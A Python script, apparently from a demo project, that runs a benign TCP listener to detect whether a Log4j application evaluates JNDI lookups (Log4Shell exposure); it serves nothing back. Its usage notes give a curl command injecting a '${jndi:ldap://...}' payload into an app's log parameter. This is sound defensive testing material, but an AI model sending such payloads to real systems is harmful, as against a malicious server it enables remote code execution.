#!/usr/bin/env python3
"""
callback-listener.py — a BENIGN listener for the safe Log4Shell reachability demo.

It opens a plain TCP socket and simply LOGS any inbound connection, then closes it.
It speaks no LDAP, returns no directory reference, and serves no Java class — so it
CANNOT cause remote code execution. It only answers one question, visibly:

    "Did the running Log4j evaluate a ${jndi:...} lookup and try to call out?"

  - Vulnerable Log4j (2.14.1): you see a connection here  -> exposure demonstrated.
  - Patched Log4j (2.17.x):    silence                    -> exposure gone.

This is the standard, responsible way to demonstrate Log4Shell exposure without
weaponizing it. See docs/SAFETY.md.

Usage:
    ./callback-listener.py [port]        # default 1389
Then, from the demo app host:
    curl 'http://<app>/api/log?msg=${jndi:ldap://<listener-host>:1389/x}'
"""
import socket
import sys
from datetime import datetime

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 1389


def main() -> None:
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", PORT))
    srv.listen(5)
    print(f"[*] Benign callback listener on 0.0.0.0:{PORT}")
    print("[*] A connection here means the running Log4j evaluated a ${jndi:...} lookup.")
    print("[*] Nothing is served back. Ctrl-C to stop.\n")
    try:
        while True:
            conn, addr = srv.accept()
            ts = datetime.now().strftime("%H:%M:%S")
            print(f"[{ts}]  ⚠️  CALLBACK RECEIVED from {addr[0]}:{addr[1]}  "
                  f"-> the app's Log4j is VULNERABLE and reached out.")
            try:
                conn.close()  # serve nothing, close immediately — no RCE path
            except OSError:
                pass
    except KeyboardInterrupt:
        print("\n[*] Listener stopped.")
    finally:
        srv.close()


if __name__ == "__main__":
    main()
